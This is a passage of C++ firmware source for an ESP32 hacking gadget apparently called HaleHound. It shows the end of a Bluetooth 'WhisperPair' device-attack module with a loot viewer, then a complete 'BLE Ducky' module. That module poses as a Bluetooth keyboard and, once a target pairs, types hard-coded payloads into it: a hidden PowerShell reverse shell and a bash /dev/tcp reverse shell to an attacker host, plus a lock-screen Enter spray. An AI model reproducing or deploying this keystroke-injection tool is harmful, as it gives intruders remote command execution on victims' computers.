                        tft.fillScreen(HALEHOUND_BLACK);
                        drawStatusBar();
                        wpDrawHeader();
                        wpDrawResult();
                    } else if (inResult) {
                        inResult = false;
                        tft.fillScreen(HALEHOUND_BLACK);
                        drawStatusBar();
                        wpDrawHeader();
                        wpDrawList();
                    } else {
                        wpExit = true;
                    }
                    lastTap = millis();
                    return;
                }
                else if (tx >= 96 && tx < 144) {
                    // Loot viewer icon — generous touch zone around x=112
                    if (!inResult && !inAttackResult && !inAttack) {
                        inLootViewer = true;
                        WPLootViewer::setup();
                        lastTap = millis();
                        return;
                    }
                }
                else if (tx >= 210 && tx < 226) {
                    // Rescan icon
                    if (!inResult && !inAttackResult) {
                        wpDoScan();
                    }
                    lastTap = millis();
                    return;
                }
            }
        }
    }

    // Button handling
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (inAttackResult) {
            inAttackResult = false;
            inResult = true;
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            wpDrawHeader();
            wpDrawResult();
        } else if (inResult) {
            inResult = false;
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            wpDrawHeader();
            wpDrawList();
        } else {
            wpExit = true;
        }
        return;
    }

    if (!inResult) {
        // Device list navigation
        if (buttonPressed(BTN_UP)) {
            if (wpCurIdx > 0) {
                wpCurIdx--;
                if (wpCurIdx < wpListStart) wpListStart--;
                wpDrawList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (wpCurIdx < wpCount - 1) {
                wpCurIdx++;
                if (wpCurIdx >= wpListStart + WP_MAX_VISIBLE) wpListStart++;
                wpDrawList();
            }
        }

        if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_RIGHT)) {
            if (wpCount > 0) {
                wpProbeDevice(wpCurIdx);
            } else {
                wpDoScan();
            }
        }

        if (buttonPressed(BTN_LEFT)) {
            wpDoScan();
        }

        // Touch to select device — list items draw at y=98 with WP_LINE_HEIGHT spacing
        int visCount = wpCount - wpListStart;
        if (visCount > WP_MAX_VISIBLE) visCount = WP_MAX_VISIBLE;
        int touched = getTouchedMenuItem(98, WP_LINE_HEIGHT, visCount);
        if (touched >= 0) {
            wpCurIdx = wpListStart + touched;
            wpDrawList();          // highlight before probe
            wpProbeDevice(wpCurIdx);
        }

        // Touch bottom bar area to rescan (no BTN_LEFT touch zone on CYD)
        {
            uint16_t bx, by;
            if (getTouchPoint(&bx, &by) && by >= SCREEN_HEIGHT - 18) {
                wpDoScan();
            }
        }
    } else if (inAttackResult) {
        // SAVE — BTN_DOWN zone (x=0-80,y=260-320) covers the save button perfectly
        if (buttonPressed(BTN_DOWN) || buttonPressed(BTN_SELECT)) {
            wpSaveLoot();
            waitForTouchRelease();
        }

        // Page nav — BTN_BACK zone (x=160-240,y=0-60) or BTN_UP zone (x=0-80,y=0-60)
        if (buttonPressed(BTN_BACK)) {
            atkResultPage = (atkResultPage == 0) ? 1 : 0;
            wpDrawAttackReport();
        }
        if (buttonPressed(BTN_RIGHT)) {
            if (atkResultPage < 1) { atkResultPage++; wpDrawAttackReport(); }
        }
        if (buttonPressed(BTN_LEFT)) {
            if (atkResultPage > 0) { atkResultPage--; wpDrawAttackReport(); }
        }
    } else {
        // Result view — LEFT returns to list
        if (buttonPressed(BTN_LEFT)) {
            inResult = false;
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            wpDrawHeader();
            wpDrawList();
        }

        // ATTACK button for vulnerable devices
        if (wpProbeIdx >= 0 && wpProbeIdx < wpCount) {
            FPDevice& rd = wpDevs[wpProbeIdx];
            if (rd.result == WPR_EXPOSED || rd.result == WPR_VULNERABLE) {
                if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_RIGHT)) {
                    wpRunAttack();
                    return;
                }
                uint16_t atx, aty;
                if (getTouchPoint(&atx, &aty)) {
                    if (atx >= 140 && atx <= 232 && aty >= SCREEN_HEIGHT - 35 && aty <= SCREEN_HEIGHT - 7) {
                        waitForTouchRelease();
                        wpRunAttack();
                        return;
                    }
                }
            }
        }
    }
}

bool isExitRequested() { return wpExit; }

void cleanup() {
    if (inLootViewer) {
        WPLootViewer::cleanup();
        inLootViewer = false;
    }
    if (pWpClient) {
        pWpClient->disconnect();
        pWpClient = nullptr;  // deinit cleans up tracked clients
    }
    if (pWpScan) pWpScan->stop();
    BLEDevice::deinit(false);
    wpInit = false;
    wpExit = false;
    inResult = false;
    inAttack = false;
    inAttackResult = false;
    inLootViewer = false;
    wpAtkLogCount = 0;
    wpCount = 0;
    wpProbeIdx = -1;

    #if CYD_DEBUG
    Serial.println("[WP] Cleanup complete");
    #endif
}

}  // namespace WhisperPair


// ═══════════════════════════════════════════════════════════════════════════
// BLE DUCKY - BLE HID Keyboard Injection
// ESP32 acts as Bluetooth Low Energy HID keyboard
// When a target device pairs, injects pre-programmed keystroke payloads
// Library: T-vK/ESP32-BLE-Keyboard v0.3.2
// ═══════════════════════════════════════════════════════════════════════════

#include <BleKeyboard.h>

namespace BleDucky {

// ── Payload definitions ───────────────────────────────────────────────────
enum BdPayloadType {
    BD_REVSHELL_PS = 0,    // PowerShell reverse shell (Win+R)
    BD_REVSHELL_BASH,      // Bash reverse shell (Ctrl+Alt+T)
    BD_LOCKSCREEN,         // Lock screen credential spray
    BD_RICKROLL,           // Rick Roll (opens browser — CTF/demo)
    BD_CUSTOM_STRING,      // User text
    BD_PAYLOAD_COUNT       // 5
};

static const char* const BD_PAYLOAD_NAMES[] = {
    "RevShell PS",
    "RevShell Bash",
    "Lock Bypass",
    "Rick Roll",
    "Custom Text"
};

// Payload strings (PROGMEM)
static const char BD_PS_CMD[] PROGMEM =
    "powershell -NoP -W Hidden -Exec Bypass -C "
    "\"$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);"
    "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
    "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=(iex $d 2>&1|Out-String);"
    "$t=[text.encoding]::ASCII.GetBytes($r);"
    "$s.Write($t,0,$t.Length)}\"";

static const char BD_BASH_CMD[] PROGMEM =
    "bash -i >& /dev/tcp/LHOST/LPORT 0>&1";

static const char BD_RICKROLL_URL[] PROGMEM =
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

// ── State ─────────────────────────────────────────────────────────────────
struct BdState {
    int     selectedPayload;
    bool    injecting;
    bool    connected;
    int     keystrokesTotal;
    int     keystrokesSent;
    char    customString[256];
    int     customLen;
};

static BdState* bd = nullptr;
static BleKeyboard* bleKb = nullptr;
static bool bdExitRequested = false;
static bool bdUiDrawn = false;
static unsigned long bdLastDisplay = 0;
static bool bdBleInitialized = false;

// Dirty-flag redraw — only repaint when state changes
static bool    bdPrevConnected = false;
static bool    bdDirty = true;

// ── Icon bar ──────────────────────────────────────────────────────────────
#define BD_ICON_NUM 3
static const int bdIconX[BD_ICON_NUM] = {SCALE_X(130), SCALE_X(170), 10};
static const unsigned char* const bdIcons[BD_ICON_NUM] = {
    bitmap_icon_start,     // Inject / Stop
    bitmap_icon_RIGHT,     // Next payload
    bitmap_icon_go_back    // Back
};

static void drawBdIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < BD_ICON_NUM; i++) {
        tft.drawBitmap(bdIconX[i], ICON_BAR_Y, bdIcons[i], 16, 16, HALEHOUND_MAGENTA);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// ── Inject a single payload string via BLE keyboard ───────────────────────
static void injectPayload() {
    if (!bd || !bleKb || !bleKb->isConnected()) return;

    char payloadBuf[256];
    const char* payload = nullptr;

    switch (bd->selectedPayload) {
        case BD_REVSHELL_PS:
            // Win+R to open Run dialog
            bleKb->press(KEY_LEFT_GUI);
            bleKb->press('r');
            delay(85);
            bleKb->releaseAll();
            delay(500);
            strncpy_P(payloadBuf, BD_PS_CMD, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;

        case BD_REVSHELL_BASH:
            // Ctrl+Alt+T to open terminal
            bleKb->press(KEY_LEFT_CTRL);
            bleKb->press(KEY_LEFT_ALT);
            bleKb->press('t');
            delay(85);
            bleKb->releaseAll();
            delay(800);
            strncpy_P(payloadBuf, BD_BASH_CMD, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;

        case BD_LOCKSCREEN:
            // Rapid Enter presses (attempts blank/common passwords)
            bd->keystrokesTotal = 10;
            for (int i = 0; i < 10 && bd->injecting; i++) {
                bleKb->write(KEY_RETURN);
                delay(200);
                bd->keystrokesSent = i + 1;
            }
            return;

        case BD_RICKROLL:
            // Win+R → browser URL
            bleKb->press(KEY_LEFT_GUI);
            bleKb->press('r');
            delay(85);
            bleKb->releaseAll();
            delay(500);
            strncpy_P(payloadBuf, BD_RICKROLL_URL, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;

        case BD_CUSTOM_STRING:
            payload = bd->customString;
            break;

        default:
            payload = "echo HaleHound";
            break;
    }

    if (!payload) return;

    bd->keystrokesTotal = strlen(payload);
    bd->keystrokesSent = 0;

    // Type the payload character by character
    for (int i = 0; payload[i] && bd->injecting; i++) {
        if (!bleKb->isConnected()) {
            bd->connected = false;
            break;
        }
        bleKb->write((uint8_t)payload[i]);
        bd->keystrokesSent = i + 1;
        delay(50);  // 50ms between keystrokes (BLE is slower than NRF24)
    }

    // Press Enter to execute
    if (bd->injecting && bleKb->isConnected()) {
        delay(50);
        bleKb->write(KEY_RETURN);
    }

    bd->injecting = false;
}

// ── Draw main UI ──────────────────────────────────────────────────────────
static void drawBdDisplay() {
    int y = CONTENT_Y_START + 4;

    tft.fillRect(0, y, SCREEN_WIDTH, SCREEN_HEIGHT - y, TFT_BLACK);

    // Connection status
    tft.setTextSize(1);
    tft.setCursor(10, y);
    if (bd->connected) {
        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
        tft.print("CONNECTED");
    } else {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.print("WAITING FOR PAIR...");
    }
    y += 14;

    // Device name
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, y);
    tft.print("Name: HaleHound KB");
    y += 14;

    tft.drawLine(10, y, SCREEN_WIDTH - 10, y, HALEHOUND_HOTPINK);
    y += 6;

    // Payload selector
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setCursor(10, y);
    tft.print("PAYLOAD:");
    y += 12;

    for (int i = 0; i < BD_PAYLOAD_COUNT; i++) {
        tft.setCursor(20, y);
        if (i == bd->selectedPayload) {
            tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
            tft.print("> ");
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.print("  ");
        }
        tft.print(BD_PAYLOAD_NAMES[i]);
        y += 12;
    }

    y += 6;
    tft.drawLine(10, y, SCREEN_WIDTH - 10, y, HALEHOUND_HOTPINK);
    y += 6;

    // Injection status
    if (bd->injecting) {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(10, y);
        tft.print("INJECTING...");
        y += 14;

        // Progress bar
        int barX = 10;
        int barW = SCREEN_WIDTH - 20;
        int barH = SCALE_H(14);
        tft.drawRect(barX, y, barW, barH, HALEHOUND_MAGENTA);
        int progress = 0;
        if (bd->keystrokesTotal > 0) {
            progress = (bd->keystrokesSent * (barW - 2)) / bd->keystrokesTotal;
        }
        tft.fillRect(barX + 1, y + 1, progress, barH - 2, HALEHOUND_HOTPINK);
        y += barH + 6;

        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(10, y);
        tft.printf("SENT: %d/%d", bd->keystrokesSent, bd->keystrokesTotal);
    } else if (bd->keystrokesSent > 0) {
        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
        tft.setCursor(10, y);
        tft.print("INJECTION COMPLETE");
        y += 14;
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(10, y);
        tft.printf("SENT: %d keystrokes", bd->keystrokesSent);
    } else if (!bd->connected) {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(10, y);
        tft.print("Pair a device to begin");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(10, y);
        tft.print("READY - Press START to inject");
    }
}

// ── Setup ─────────────────────────────────────────────────────────────────
void setup() {
    bdExitRequested = false;
    bdUiDrawn = false;
    bdLastDisplay = 0;
    bdBleInitialized = false;
    bdPrevConnected = false;
    bdDirty = true;

    // Allocate state
    if (bd) { free(bd); bd = nullptr; }
    bd = (BdState*)calloc(1, sizeof(BdState));
    if (!bd) {
        tft.fillScreen(TFT_BLACK);
        drawCenteredText(120, "HEAP ALLOC FAILED", HALEHOUND_HOTPINK, 2);
        return;
    }
    bd->selectedPayload = BD_RICKROLL;  // Default to safe demo payload

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    drawGlitchText(SCALE_Y(55), "BLE DUCKY", &Nosifer_Regular10pt7b);

    drawBdIconBar();

    // Stop WiFi to free radio for BLE
    esp_wifi_stop();
    delay(100);

    // Release Classic BT memory (MANDATORY per MEMORY.md)
    releaseClassicBtMemory();

    // Initialize BLE Keyboard
    // ESP32-BLE-Keyboard calls BLEDevice::init() internally in begin()
    if (bleKb) { delete bleKb; bleKb = nullptr; }
    bleKb = new BleKeyboard("HaleHound KB", "HaleHound", 100);
    bleKb->begin();
    delay(150);  // Settle time before TX power set

    // Max BLE TX power
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    bdBleInitialized = true;
    drawBdDisplay();
    bdUiDrawn = true;

    #if CYD_DEBUG
    Serial.println("[BLE_DUCKY] Setup complete, advertising as 'HaleHound KB'");
    Serial.printf("[BLE_DUCKY] Free heap: %u\n", ESP.getFreeHeap());
    #endif
}

// ── Loop ──────────────────────────────────────────────────────────────────
void loop() {
    if (!bdUiDrawn) {
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            bdExitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    // Update connection state
    if (bleKb) {
        bool wasConnected = bd->connected;
        bd->connected = bleKb->isConnected();
        if (bd->connected != wasConnected) {
            // Connection state changed — force redraw
            bdDirty = true;
            #if CYD_DEBUG
            Serial.printf("[BLE_DUCKY] %s\n", bd->connected ? "DEVICE CONNECTED" : "DEVICE DISCONNECTED");
            #endif
        }
    }

    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            // Back
            if (tx < 40) {
                bdExitRequested = true;
                return;
            }
            // Inject / Stop
            if (tx >= bdIconX[0] - 10 && tx < bdIconX[0] + 25) {
                waitForTouchRelease();
                delay(200);
                if (bd->injecting) {
                    bd->injecting = false;
                } else if (bd->connected) {
                    bd->injecting = true;
                    bd->keystrokesSent = 0;
                    bd->keystrokesTotal = 0;
                    bdDirty = true;
                    drawBdDisplay();
                    injectPayload();  // Runs on Core 1 (BLE lib handles its own tasks)
                }
                return;
            }
            // Next payload
            if (tx >= bdIconX[1] - 10 && tx < bdIconX[1] + 25) {
                waitForTouchRelease();
                delay(200);
                bd->selectedPayload = (bd->selectedPayload + 1) % BD_PAYLOAD_COUNT;
                bdDirty = true;
                return;
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        bdExitRequested = true;
        return;
    }

    // Only redraw when state actually changes — prevents screen flash
    if (bdDirty && millis() - bdLastDisplay >= 100) {
        drawBdDisplay();
        bdLastDisplay = millis();
        bdDirty = false;
    }
}

bool isExitRequested() {
    return bdExitRequested;
}

void cleanup() {
    bd->injecting = false;

    if (bleKb) {
        bleKb->end();
        delete bleKb;
        bleKb = nullptr;
    }

    // Deinit BLE — use deinit(false) per MEMORY.md (deinit(true) is broken)
    if (bdBleInitialized) {
        BLEDevice::deinit(false);
        bdBleInitialized = false;
    }

    if (bd) { free(bd); bd = nullptr; }
    bdExitRequested = false;
    bdUiDrawn = false;

    #if CYD_DEBUG
    Serial.println("[BLE_DUCKY] Cleanup complete");
    #endif
}

}  // namespace BleDucky
